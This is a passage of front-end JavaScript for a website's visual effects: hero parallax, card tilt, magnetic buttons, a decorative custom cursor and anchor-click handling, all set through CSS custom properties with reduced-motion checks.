  const hero = $('.hero');
  const heroCopy = $('.hero-copy');
  const heroVisual = $('.hero-visual');
  let parallaxTick = false;
  const updateParallax = () => {
    parallaxTick = false;
    if (reducedMotion || !hero) return;
    const y = Math.min(window.scrollY, Math.max(0, hero.offsetHeight));
    const factor = Math.min(1, y / Math.max(1, hero.offsetHeight));
    if (heroCopy) heroCopy.style.setProperty('--parallax-y', `${(-factor * 22).toFixed(1)}px`);
    if (heroVisual) heroVisual.style.setProperty('--parallax-y', `${(-factor * 34).toFixed(1)}px`);
  };
  const onParallaxScroll = () => {
    if (parallaxTick) return;
    parallaxTick = true;
    requestAnimationFrame(updateParallax);
  };
  addEventListener('scroll', onParallaxScroll, { passive: true });
  updateParallax();

  // Desktop card tilt with CSS custom properties only.
  if (!reducedMotion && matchMedia('(pointer: fine)').matches && innerWidth >= 901) {
    $$('[data-tilt]').forEach(card => {
      const move = event => {
        const rect = card.getBoundingClientRect();
        if (!rect.width || !rect.height) return;
        const x = (event.clientX - rect.left) / rect.width - 0.5;
        const y = (event.clientY - rect.top) / rect.height - 0.5;
        card.style.setProperty('--rx', `${(-y * 3.2).toFixed(2)}deg`);
        card.style.setProperty('--ry', `${(x * 4.2).toFixed(2)}deg`);
        card.style.setProperty('--tz', '7px');
      };
      const leave = () => {
        card.style.setProperty('--rx', '0deg');
        card.style.setProperty('--ry', '0deg');
        card.style.setProperty('--tz', '0px');
      };
      card.addEventListener('pointermove', move, { passive: true });
      card.addEventListener('pointerleave', leave, { passive: true });
    });
  }

  // Magnetic effect for primary actions only.
  if (!reducedMotion && matchMedia('(pointer: fine)').matches) {
    $$('.hero-actions .btn, .contact-links a, .contact-links button').forEach(button => {
      const move = event => {
        const rect = button.getBoundingClientRect();
        const x = (event.clientX - rect.left - rect.width / 2) * 0.08;
        const y = (event.clientY - rect.top - rect.height / 2) * 0.08;
        button.style.setProperty('--mx-btn', `${x.toFixed(1)}px`);
        button.style.setProperty('--my-btn', `${y.toFixed(1)}px`);
      };
      const leave = () => {
        button.style.setProperty('--mx-btn', '0px');
        button.style.setProperty('--my-btn', '0px');
      };
      button.addEventListener('pointermove', move, { passive: true });
      button.addEventListener('pointerleave', leave, { passive: true });
    });
  }

  // Custom cursor is purely decorative and never required for interaction.
  const dot = $('#cursorDot');
  const ring = $('#cursorRing');
  if (!reducedMotion && dot && ring && matchMedia('(pointer: fine)').matches) {
    let mouseX = innerWidth / 2, mouseY = innerHeight / 2;
    let ringX = mouseX, ringY = mouseY;
    const moveCursor = event => {
      mouseX = event.clientX;
      mouseY = event.clientY;
      body.style.setProperty('--mx', `${mouseX}px`);
      body.style.setProperty('--my', `${mouseY}px`);
      dot.style.opacity = '1';
      ring.style.opacity = '1';
      dot.style.left = `${mouseX}px`;
      dot.style.top = `${mouseY}px`;
    };
    addEventListener('pointermove', moveCursor, { passive: true });
    const cursorFrame = () => {
      ringX += (mouseX - ringX) * 0.16;
      ringY += (mouseY - ringY) * 0.16;
      ring.style.left = `${ringX}px`;
      ring.style.top = `${ringY}px`;
      requestAnimationFrame(cursorFrame);
    };
    requestAnimationFrame(cursorFrame);
    $$('a, button, input, [data-tilt]').forEach(element => {
      element.addEventListener('pointerenter', () => ring.classList.add('hover'));
      element.addEventListener('pointerleave', () => ring.classList.remove('hover'));
    });
  }

  /* Ensure anchors work even when a script or animation library fails. */
  $$('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', () => {
      const id = anchor.getAttribute('href');
      if (id && id.length > 1) setTimeout(() => updateProgress(), 0);
    });
  });

  // Release the timer on page teardown.
  addEventListener('pagehide', () => window.clearTimeout(typeTimer), { once: true });
})();
